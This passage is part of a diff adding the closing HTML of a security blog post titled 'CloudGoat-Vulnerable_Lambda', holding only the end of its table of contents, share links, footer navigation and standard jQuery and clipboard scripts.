<span class="toc-text">Recommended Fixes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.8.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&text=CloudGoat-Vulnerable_Lambda"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&is_video=false&description=CloudGoat-Vulnerable_Lambda"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CloudGoat-Vulnerable_Lambda&body=Check out this article: https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&name=CloudGoat-Vulnerable_Lambda&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&t=CloudGoat-Vulnerable_Lambda"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
